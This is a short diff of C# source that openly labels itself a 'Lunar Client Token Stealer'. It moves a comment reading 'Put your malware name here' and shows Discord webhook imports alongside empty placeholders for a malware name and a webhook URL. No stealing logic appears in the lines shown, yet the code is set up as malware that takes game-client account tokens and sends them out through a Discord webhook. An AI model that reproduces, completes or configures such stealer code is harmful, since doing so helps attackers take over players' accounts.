@@ -1,9 +1,9 @@
 ﻿// Lunar Client Token Stealer written by Tsukilo on 29/12/2021
 
-// Put your malware name here
 using Discord;
 using Discord.Webhook;
 
+// Put your malware name here
 String name = "";
 // Put your webhook URL here
 String webhook = "";
